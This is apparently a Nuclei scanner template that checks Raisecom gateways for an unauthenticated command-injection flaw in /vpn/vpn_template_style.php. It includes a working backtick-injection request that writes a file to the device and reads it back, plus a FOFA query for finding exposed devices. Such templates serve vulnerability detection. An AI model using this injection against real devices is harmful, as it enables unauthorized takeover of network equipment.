flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "Web user login")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200 && status_code_2 == 200
    - contains(content_type_2, "text/plain")
    - contains(body_2, '{{string}}')
    type: dsl
  raw:
  - 'GET /vpn/vpn_template_style.php?mySubmit=true&stylenum=%60echo+-e+%27{{string}}%27%3E/www/tmp/{{filename}}.txt%60
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /tmp/{{filename}}.txt HTTP/1.1

    Host: {{Hostname}}

    '
id: raisecom-rce
info:
  author: 3th1c_yuk1
  description: 'The /vpn/vpn_template_style.php endpoint in Raisecom Multi-Service
    Intelligent Gateway is vulnerable to unauthenticated remote command execution.
    The stylenum parameter fails to properly sanitize user input, allowing attackers
    to inject system commands using backticks (`\) or pipe (|`) characters.

    '
  impact: 'Successful exploitation allows arbitrary command execution on the target
    device, enabling actions such as file manipulation or system control. This vulnerability
    affects multiple instances and does not require authentication.

    '
  metadata:
    fofa-query: '"<TITLE>Web user login</TITLE>" && "<META content\==MSHTML 6.00.2900.5583\"
      name\=GENERATOR></HEAD>"'
    max-request: 2
    verified: true
  name: Raisecom Gateway vpn_template_style.php - Remote Command Execution
  reference:
  - https://github.com/koishi0x01/CVE/blob/main/CVE_1.md
  severity: critical
  tags: raisecom,rce,intrusive,vuln
variables:
  filename: '{{to_lower(rand_text_alpha(5))}}'
  string: '{{randstr}}'
